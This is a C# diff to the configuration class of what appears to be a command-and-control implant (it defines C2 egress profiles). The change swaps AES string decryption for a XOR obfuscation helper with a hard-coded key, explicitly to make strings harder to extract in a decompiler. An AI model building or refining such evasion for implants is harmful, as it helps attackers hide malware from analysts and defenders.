@@ -17,6 +17,7 @@ using System.Collections.Generic;
 using System.Linq;
 using System.Text;
 using System.Security.Cryptography;
+using System.Runtime.InteropServices;
 using Interop.Structs.Structs;
 using PSKCryptography;
 using Interop.Serializers;
@@ -33,41 +34,18 @@ namespace Jelly
 {
     public static class Config
     {
-        // Encryption key - change this to a random value
-        private static readonly byte[] _encryptionKey = new byte[] 
-        { 
-            0x7a, 0x4d, 0x1b, 0x8e, 0x3c, 0x9f, 0x2d, 0x5a, 
-            0x6b, 0x1e, 0x4f, 0x9c, 0x2a, 0x7d, 0x3b, 0x8c,
-            0x5e, 0x1a, 0x6f, 0x4d, 0x2c, 0x9b, 0x3d, 0x7a,
-            0x1c, 0x8f, 0x5b, 0x2e, 0x6d, 0x4a, 0x9e, 0x3f
-        };
+        // XOR key for string obfuscation (change this to a random value)
+        private static readonly byte[] _xorKey = new byte[] { 0x42, 0x7C, 0x9E, 0x3F, 0xA1, 0x5D, 0xC8, 0x12 };
 
-        private static string DecryptString(string encryptedBase64)
+        // Helper method to XOR strings (simple obfuscation visible in dnSpy but harder to extract)
+        private static string UnobfuscateString(byte[] obfuscatedBytes)
         {
-            try
+            byte[] result = new byte[obfuscatedBytes.Length];
+            for (int i = 0; i < obfuscatedBytes.Length; i++)
             {
-                byte[] encryptedData = Convert.FromBase64String(encryptedBase64);
-                using (Aes aes = Aes.Create())
-                {
-                    aes.Key = _encryptionKey;
-                    aes.Mode = CipherMode.CBC;
-                    aes.Padding = PaddingMode.PKCS7;
-                    
-                    byte[] iv = new byte[aes.IV.Length];
-                    Array.Copy(encryptedData, 0, iv, 0, iv.Length);
-                    aes.IV = iv;
-                    
-                    using (ICryptoTransform decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
-                    {
-                        byte[] decryptedData = decryptor.TransformFinalBlock(encryptedData, iv.Length, encryptedData.Length - iv.Length);
-                        return Encoding.UTF8.GetString(decryptedData);
-                    }
-                }
+                result[i] = (byte)(obfuscatedBytes[i] ^ _xorKey[i % _xorKey.Length]);
             }
-            catch
-            {
-                return encryptedBase64;
-            }
+            return Encoding.UTF8.GetString(result);
         }
         public static Dictionary<string, C2ProfileData> EgressProfiles = new Dictionary<string, C2ProfileData>()
         {
